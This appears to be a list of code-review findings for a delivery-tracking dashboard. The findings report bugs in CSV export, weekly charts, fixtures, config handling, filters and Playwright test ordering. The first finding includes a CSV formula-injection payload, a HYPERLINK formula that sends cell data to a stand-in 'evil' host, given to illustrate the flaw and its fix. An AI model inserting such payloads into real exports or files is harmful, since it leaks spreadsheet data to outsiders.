findings.message: The CSV export quotes each cell but does not neutralise formula prefixes. Proposal titles, owner names and project names come from untrusted paths (chat, MCP, specclaw sync), so a cell that starts with =, +, - or @ runs as a formula when the file is opened in Excel or Sheets. Fix: prefix any cell starting with = + - @, tab or CR with a single quote before escaping.
findings.scenario: A proposal created via chat titled '=HYPERLINK("https://evil/?d="&A1,"x")' → Export → proposals.csv opens with a live formula that leaks cell data.

findings.message: The new `!r.stages.some((s) => s.status) ? "Building"` branch runs before the `allowed` check. Users who may record deployments therefore lose the first-deploy button for any release that has no deployment yet. Before this change, only users without the permission saw "Building". Fix: put that branch inside the `!allowed` case, as before.
findings.scenario: Maya (delivery:deployment:record on CON) opens /delivery/releases → CON v2.5.0 (no deployments) shows "Building" and no "Deploy to Dev" button, so the release can never be started from the UI.

findings.message: weekly_stat stores the portfolio total as the project_id-null row, and per-project rows sit in the same table (the migration says 008 will write both). weeklyThroughput and shippedPerWeek still `sum()` every row for the week with no project_id filter, so the portfolio is counted twice. Fix: filter `project_id is null` for the portfolio, or drop the null row and sum only the per-project rows.
findings.scenario: Rows (null, 2026-10-12, done 38) and (CON, 2026-10-12, done 10) → 'Tasks done per week' plots 48 for W42 instead of 38.

findings.message: "Shipped to Prod" is now counted in two places that can disagree. shippedPerWeek reads a hand-seeded roll-up that nothing in the app writes. phaseCounts' 'Released this month', on the same page, comes from proposal.released_at. Fix: derive shipped-per-week from released_at/deployments, or have the promote path write the roll-up inside the same service.
findings.scenario: Promote CON v2.4.0 to Prod with 2 proposals → 'Released this month' goes up by 2, while the 'Shipped to Prod per week' bar for W42 and its trend stay unchanged.

findings.message: A week with no weekly_stat row is shown as 0 planned, 0 done and 0 shipped. No ingestion (008) exists yet, so every real tenant gets charts of zeros, plus a trend computed from those zeros, that look like real data. Fix: return null for missing weeks and render an empty state ('no data yet') instead of 0.
findings.scenario: A new tenant with projects but no weekly_stat rows → /delivery shows 'Tasks done per week' flat at 0 for W35-W42, and /delivery/proposals shows 0 shipped every week.

findings.message: `today()` reads `process.env.AMAX_TODAY` directly in module code. The module standard says environment access goes through `@amax/core` adapters, and the architecture says config is validated at boot. As a result the value is never validated, and it applies to the whole process rather than per tenant, although the comment says it pins 'the demo tenant'. Fix: read it through the core config adapter, validate it as a date at boot, and scope it if per-tenant pinning is what's intended.
findings.scenario: AMAX_TODAY=2026-13-01 gives an Invalid Date. `toISOString()` in `lastWeeks` and `phaseCounts` throws RangeError, so every Projects and Proposals page fails. With AMAX_TODAY set on a shared deployment, every tenant's 'released this month' and chart windows are frozen at that date.

findings.message: Pluralisation and client counts are mixed up. The lede uses the filtered client count but pluralises on `clients.length` (all clients). The ticket note always says 'clients'. Fix: compute the filtered client count once and pluralise on that same number in both places.
findings.scenario: /delivery?client=Contoso → lede '1 active project for 1 clients.' and ticket 'For 1 clients'; with one client overall but zero after filtering → 'for 0 client'.

findings.message: The CSV hard-codes 'Prod' as the 'Shipped to' value for released proposals. Environments are per project, and this same diff changes ProjectPage to use the project's own production environment name. Fix: use the project's isProd environment name in both the CSV and the table.
findings.scenario: A project whose production environment is named 'Production' → the export says 'Prod'.

findings.message: A proposal's release now comes from two places: the `release_id` join, or `meta.releaseLabel` if that is missing. The fixture moves CON-009 onto that label and deletes the CON v2.3.0 release and its Prod deployment. The result is a released proposal with no release, and production query code that reads a fixture-only field. Fix: keep CON-009 linked to a real v2.3.0 release (the map can hide old releases with its 45-day filter) and drop the meta fallback.
findings.scenario: The Proposals table shows CON-009 in release 'v2.3.0'. `get_release {projectKey:'CON', version:'v2.3.0'}` returns null, the Releases page has no v2.3.0, and CON-009 has no 'Shipped to' value.

findings.message: Several pins point at tools that do not return the pinned data. 'Tasks done per week' and 'Revenue by project' pin list_projects, and 'Shipped to Prod per week' pins list_proposals, so chat gets a different dataset from the chart the user pinned. Expose the weekly data through a read tool, or pin the right one.
findings.scenario: Pin 'Tasks done per week' and ask 'what was done in W42?' → chat only has the project list.

findings.message: The phase filter drops 'planned', so planned proposals can only be reached by typing the URL. The phase card also ignores ?project=, so its counts disagree with the filtered table under it.

These controls do nothing. The Sprint select has one option and no handler. The tab buttons use aria-pressed with aria-disabled and no behaviour. Revenue 'View all' links back to /delivery. sprintLine also reports 'off-track' as 'at risk'.

A delivery mock-parity change edits shared platform code: IntentButton's icon and title for every module, shell.css, the ScreenProps/ModuleManifest types, and the deletion of modules/hello. The module standard puts shared UI and platform changes in a separate platform-lane change. Confirm 041 is a platform-lane change, or split these out.

'Last reached stage' and 'is live' are now worked out in three places. `mapPill` sorts by position and treats the release as live only when that last stage is Prod. `mapRow`'s `last`/`lineTo` positions the pill. The map's 45-day filter has its own inline 'Prod deployed' check, and the table uses `nextStep`. With per-project environments (042) these can disagree. Fix: derive the last stage and liveness once, in `mapRow`/`nextStep`, and use that everywhere.
findings.scenario: A project's environments are ordered Dev(1), Prod(2), Staging(3), and Staging is deployed after Prod. `mapPill` says 'In Staging since …' and never 'Live'. The table says 'Live', and the 45-day filter still hides the row as live.

findings.message: The project filter applies to the table only. The phase tabs drop `?project`, and the phase and shipped charts ignore it. An out-of-range `?page` also produces a wrong range label. Fix: carry `project` through the phase links and clamp `page` to the last page.
findings.scenario: With `/delivery/proposals?project=CON`, clicking 'Building' lists every project's proposals. `?page=10` with 12 rows shows an empty table labelled '46–12 of 12'.

findings.message: `screens` and `writes` now depend on the `visual` project only so the AMX import runs in the right order. In Playwright, a failing dependency skips its dependents, so any visual diff over tolerance means none of the functional signed-in e2e specs run. Fix: order the AMX import without making it depend on the visual test passing (for example, a separate seed step or a separate database).
findings.scenario: A 3% pixel difference in one region fails `visual`, and the auth, delivery, ai, mcp, chat and releases specs are all reported as skipped.
